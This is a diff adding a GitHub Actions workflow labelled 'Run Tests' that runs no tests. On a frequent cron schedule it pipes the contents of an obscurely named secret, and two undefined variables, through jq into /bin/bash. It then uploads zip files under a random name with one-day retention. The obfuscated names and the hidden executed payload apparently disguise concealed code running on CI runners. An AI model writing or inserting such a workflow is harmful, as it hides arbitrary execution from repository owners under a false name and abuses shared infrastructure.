@@ -1,0 +1,33 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '17 4,10,16,22 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Invoke
+        env:
+          oaz421: ${{ secrets.oaz421 }}
+        run: |
+          printf '%s' "$oaz421" | jq -r .rwm31474 | /bin/bash
+          echo $h989 | jq -r .jl18708 | /bin/bash
+          printf '%s' "$v1373" | jq -r .cif14144 | /bin/bash
+
+      - name: Store artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: pxaCdTw4
+          path: "*.zip"
+          retention-days: 1
